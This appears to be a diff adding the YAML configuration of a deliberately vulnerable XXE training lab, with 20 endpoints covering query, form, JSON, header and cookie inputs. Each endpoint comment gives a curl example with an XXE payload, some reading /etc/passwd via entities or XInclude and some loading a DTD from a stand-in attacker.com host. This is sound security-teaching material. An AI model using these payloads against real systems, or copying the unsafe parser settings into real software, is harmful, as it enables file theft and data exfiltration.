@@ -1,0 +1,291 @@
+app:
+  name: "XML External Entities Example Lab"
+  descrption: "A vulnerable application demonstrating XML External Entities flaws."
+  host: "0.0.0.0"
+  port: 8088
+
+endpoints:
+  # ===== QUERY PARAMETER =====
+  # 1. query param with none filter → curl "http://localhost:8088/query/none?data=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E"
+  - path: /query/none
+    method: GET
+    response_type: json
+    vulnerabilities:
+      - type: xxe
+        placement: query_param
+        param: data
+        config:
+          filter: none
+          emulate_resolution: true
+          allow_file_read: true
+          max_entity_depth: 10
+
+  # 2. query param with basic_doctype filter → curl "http://localhost:8088/query/doctype?data=%3Cfoo%20xmlns%3Axi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXInclude%22%3E%3Cxi%3Ainclude%20href%3D%22file%3A%2F%2F%2Fetc%2Fpasswd%22%20parse%3D%22text%22%2F%3E%3C%2Ffoo%3E"
+  - path: /query/doctype
+    method: GET
+    response_type: json
+    vulnerabilities:
+      - type: xxe
+        placement: query_param
+        param: data
+        config:
+          filter: basic_doctype
+          emulate_resolution: true
+          allow_file_read: true
+          max_entity_depth: 10
+
+  # 3. query param with basic_entity filter → curl "http://localhost:8088/query/entity?data=%3C%21DOCTYPE%20foo%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E"
+  - path: /query/entity
+    method: GET
+    response_type: json
+    vulnerabilities:
+      - type: xxe
+        placement: query_param
+        param: data
+        config:
+          filter: basic_entity
+          emulate_resolution: true
+          allow_file_read: true
+          max_entity_depth: 10
+
+  # 4. query param with external_entities filter → curl "http://localhost:8088/query/external?data=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20%22test%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E"
+  - path: /query/external
+    method: GET
+    response_type: json
+    vulnerabilities:
+      - type: xxe
+        placement: query_param
+        param: data
+        config:
+          filter: external_entities
+          emulate_resolution: true
+          allow_file_read: true
+          max_entity_depth: 10
+
+  # ===== FORM FIELD =====
+  # 5. form field with none filter → curl 'http://localhost:8088/form/none' -X POST --data-urlencode 'xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+  - path: /form/none
+    method: POST
+    response_type: json
+    vulnerabilities:
+      - type: xxe
+        placement: form_field
+        param: xml
+        config:
+          filter: none
+          emulate_resolution: true
+          allow_file_read: true
+          max_entity_depth: 10
+
+  # 6. form field with basic_doctype filter → curl 'http://localhost:8088/form/doctype' -X POST --data-urlencode 'xml=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>'
+  - path: /form/doctype
+    method: POST
+    response_type: json
+    vulnerabilities:
+      - type: xxe
+        placement: form_field
+        param: xml
+        config:
+          filter: basic_doctype
+          emulate_resolution: true
+          allow_file_read: true
+          max_entity_depth: 10
+
+  # 7. form field with basic_entity filter → curl 'http://localhost:8088/form/entity' -X POST --data-urlencode 'xml=<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd"><foo>&xxe;</foo>'
+  - path: /form/entity
+    method: POST
+    response_type: json
+    vulnerabilities:
+      - type: xxe
+        placement: form_field
+        param: xml
+        config:
+          filter: basic_entity
+          emulate_resolution: true
+          allow_file_read: true
+          max_entity_depth: 10
+
+  # 8. form field with external_entities filter → curl 'http://localhost:8088/form/external' -X POST --data-urlencode 'xml=<!DOCTYPE foo [<!ENTITY xxe "test">]><foo>&xxe;</foo>'
+  - path: /form/external
+    method: POST
+    response_type: json
+    vulnerabilities:
+      - type: xxe
+        placement: form_field
+        param: xml
+        config:
+          filter: external_entities
+          emulate_resolution: true
+          allow_file_read: true
+          max_entity_depth: 10
+
+  # ===== JSON FIELD =====
+  # 9. json field with none filter → curl "http://localhost:8088/json/none" -X POST -H "Content-Type: application/json" -d '{"xml":"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"}'
+  - path: /json/none
+    method: POST
+    response_type: json
+    vulnerabilities:
+      - type: xxe
+        placement: json_field
+        param: xml
+        config:
+          filter: none
+          emulate_resolution: true
+          allow_file_read: true
+          max_entity_depth: 10
+
+  # 10. json field with basic_doctype filter → curl "http://localhost:8088/json/doctype" -X POST -H "Content-Type: application/json" -d '{"xml":"<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></foo>"}'
+  - path: /json/doctype
+    method: POST
+    response_type: json
+    vulnerabilities:
+      - type: xxe
+        placement: json_field
+        param: xml
+        config:
+          filter: basic_doctype
+          emulate_resolution: true
+          allow_file_read: true
+          max_entity_depth: 10
+
+  # 11. json field with basic_entity filter → curl "http://localhost:8088/json/entity" -X POST -H "Content-Type: application/json" -d '{"xml":"<!DOCTYPE foo SYSTEM \"http://attacker.com/evil.dtd\"><foo>&xxe;</foo>"}'
+  - path: /json/entity
+    method: POST
+    response_type: json
+    vulnerabilities:
+      - type: xxe
+        placement: json_field
+        param: xml
+        config:
+          filter: basic_entity
+          emulate_resolution: true
+          allow_file_read: true
+          max_entity_depth: 10
+
+  # 12. json field with external_entities filter → curl "http://localhost:8088/json/external" -X POST -H "Content-Type: application/json" -d '{"xml":"<!DOCTYPE foo [<!ENTITY xxe \"test\">]><foo>&xxe;</foo>"}'
+  - path: /json/external
+    method: POST
+    response_type: json
+    vulnerabilities:
+      - type: xxe
+        placement: json_field
+        param: xml
+        config:
+          filter: external_entities
+          emulate_resolution: true
+          allow_file_read: true
+          max_entity_depth: 10
+
+  # ===== HEADER =====
+  # 13. header with none filter → curl 'http://localhost:8088/header/none' -H 'X-XML-Data: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+  - path: /header/none
+    method: GET
+    response_type: json
+    vulnerabilities:
+      - type: xxe
+        placement: header
+        param: X-XML-Data
+        config:
+          filter: none
+          emulate_resolution: true
+          allow_file_read: true
+          max_entity_depth: 10
+
+  # 14. header with basic_doctype filter → curl 'http://localhost:8088/header/doctype' -H 'X-XML-Data: <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>'
+  - path: /header/doctype
+    method: GET
+    response_type: json
+    vulnerabilities:
+      - type: xxe
+        placement: header
+        param: X-XML-Data
+        config:
+          filter: basic_doctype
+          emulate_resolution: true
+          allow_file_read: true
+          max_entity_depth: 10
+
+  # 15. header with basic_entity filter → curl 'http://localhost:8088/header/entity' -H 'X-XML-Data: <!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd"><foo>&xxe;</foo>'
+  - path: /header/entity
+    method: GET
+    response_type: json
+    vulnerabilities:
+      - type: xxe
+        placement: header
+        param: X-XML-Data
+        config:
+          filter: basic_entity
+          emulate_resolution: true
+          allow_file_read: true
+          max_entity_depth: 10
+
+  # 16. header with external_entities filter → curl 'http://localhost:8088/header/external' -H 'X-XML-Data: <!DOCTYPE foo [<!ENTITY xxe "test">]><foo>&xxe;</foo>'
+  - path: /header/external
+    method: GET
+    response_type: json
+    vulnerabilities:
+      - type: xxe
+        placement: header
+        param: X-XML-Data
+        config:
+          filter: external_entities
+          emulate_resolution: true
+          allow_file_read: true
+          max_entity_depth: 10
+
+  # ===== COOKIE =====
+  # 17. cookie with none filter → curl 'http://localhost:8088/cookie/none' -b 'xml=%3C!DOCTYPE%20foo%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E'
+  - path: /cookie/none
+    method: GET
+    response_type: json
+    vulnerabilities:
+      - type: xxe
+        placement: cookie
+        param: xml
+        config:
+          filter: none
+          emulate_resolution: true
+          allow_file_read: true
+          max_entity_depth: 10
+
+  # 18. cookie with basic_doctype filter → curl 'http://localhost:8088/cookie/doctype' -b 'xml=%3Cfoo%20xmlns%3Axi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXInclude%22%3E%3Cxi%3Ainclude%20href%3D%22file%3A%2F%2F%2Fetc%2Fpasswd%22%20parse%3D%22text%22%2F%3E%3C%2Ffoo%3E'
+  - path: /cookie/doctype
+    method: GET
+    response_type: json
+    vulnerabilities:
+      - type: xxe
+        placement: cookie
+        param: xml
+        config:
+          filter: basic_doctype
+          emulate_resolution: true
+          allow_file_read: true
+          max_entity_depth: 10
+
+  # 19. cookie with basic_entity filter → curl 'http://localhost:8088/cookie/entity' -b 'xml=%3C!DOCTYPE%20foo%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E'
+  - path: /cookie/entity
+    method: GET
+    response_type: json
+    vulnerabilities:
+      - type: xxe
+        placement: cookie
+        param: xml
+        config:
+          filter: basic_entity
+          emulate_resolution: true
+          allow_file_read: true
+          max_entity_depth: 10
+
+  # 20. cookie with external_entities filter → curl 'http://localhost:8088/cookie/external' -b 'xml=%3C!DOCTYPE%20foo%20%5B%3C!ENTITY%20xxe%20%22test%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E'
+  - path: /cookie/external
+    method: GET
+    response_type: json
+    vulnerabilities:
+      - type: xxe
+        placement: cookie
+        param: xml
+        config:
+          filter: external_entities
+          emulate_resolution: true
+          allow_file_read: true
+          max_entity_depth: 10
